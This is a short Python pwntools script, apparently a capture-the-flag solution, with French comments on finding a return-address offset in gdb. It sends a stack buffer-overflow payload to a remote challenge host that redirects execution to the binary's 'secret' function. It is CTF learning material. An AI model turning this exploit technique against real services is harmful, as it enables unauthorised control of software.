from pwn import *

HOST = 'pwnme.jdis.ca'
PORT = 1337

## première étape
# p = process('./pwn')
# gdb.attach(p)
# p.sendline(cyclic(200))
# offset = cyclic_find(0x61616174) # obtenu en faisant next dans gdb jusqu'à ce qu'il y ait un segfault. Ensuite, on fait "info frame" et on prend les 8 premiers chiffres du registre "rip"
# print(offset) # donne 76, on fait -4 à cause qu'on veut que notre addresse commence directement au début du rip

## deuxième étape
elf = ELF('pwnme')
secret = elf.symbols['secret']
offset = 72

r = remote(HOST, PORT)
r.recvuntil(b'Enter your name:\n')
payload = b'A' * offset + p64(secret)
r.sendline(payload)

data = r.recvall(timeout=2)
if data:
    print(data.decode(errors="ignore"))
r.close()

